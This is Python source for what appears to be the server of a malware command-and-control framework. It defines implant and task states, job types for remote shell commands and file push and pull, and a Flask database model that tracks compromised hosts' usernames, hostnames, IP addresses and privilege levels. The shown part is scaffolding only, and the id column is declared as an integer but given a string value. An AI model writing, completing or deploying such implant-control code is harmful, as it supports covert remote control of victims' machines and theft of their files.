from enum import Enum

class ImplantStatus(Enum):
    REGISTERING = 1
    SLEEPING = 2
    ACTIVE = 3
    TERMINATED = 4

class TaskStatus(Enum):
    QUEUED = 1
    PENDING = 2
    EXECUTING = 3
    SUCCESS = 4
    FAILURE = 5
    NOT_SUPPORTED = 6

class JobType(Enum):
    REGISTER = 1
    TERMINATE = 2
    PUSH = 3
    PULL = 4
    SHELL = 5

class RequestType(Enum):
    REGISTER = 1
    TERMINATE = 2
    GET_TASK = 3
    PUSH_START = 4
    PUSH_CHUNK = 5
    PUSH_END = 6
    PULL_START = 7
    PULL_CHUNK = 8
    PULL_END = 9
    SHELL = 10

class ProcessArch(Enum):
    X86 = 1
    X64 = 2
    ARM = 3
    ARM64 = 4

from flask import Flask, json, jsonify, url_for, request, make_response, abort
from os import path as os_path
from flask_sqlalchemy import SQLAlchemy
from werkzeug.middleware.proxy_fix import ProxyFix

import base64
import os
import shutil
import hashlib
import uuid

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..', 'data.db')
app.app_context().push()
db = SQLAlchemy(app)

class Implant(db.Model):
    __tablename__ = 'implants'
    id = db.Column(db.Integer, unique=True,primary_key=True)
    machine_guid = db.Column(db.String(36), unique=True, nullable=False)
    hostname = db.Column(db.String)
    username = db.Column(db.String, nullable=False)
    operating_system = db.Column(db.String(1024), nullable=False)
    arch = db.Column(db.String, nullable=False)
    internal_ips = db.Column(db.JSON)
    external_ip = db.Column(db.String(16))
    integrity = db.Column(db.String(64))
    created = db.Column(db.DateTime, nullable=False, server_default=db.func.now())
    updated = db.Column(db.DateTime, nullable=False, server_default=db.func.now(), onupdate=db.func.now())

    tasks = db.relationship('Task', back_populates='implant')

    def __init__(self, machine_guid='', hostname='', username='', operating_system='', arch='', internal_ips=None, external_ip='', integrity=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.machine_guid = machine_guid
        self.hostname = hostname
        self.username = username
        self.operating_system = operating_system
        self.arch = arch
        self.internal_ips = internal_ips if internal_ips is not None else {}
        self.external_ip = external_ip
        self.integrity = integrity

    def json(self):
        return {
            'id': self.id,
            'machine_guid': self.machine_guid,
            'hostname': self.hostname,
            'username': self.username,
            'operating_system': self.operating_system,
            'arch': self.arch,
            'internal_ips': json.loads(self.internal_ips) if self.internal_ips else {},
            'external_ip': self.external_ip,
            'integrity': self.integrity,
            'created': self.created.isoformat(),
            'updated': self.updated.isoformat()
        }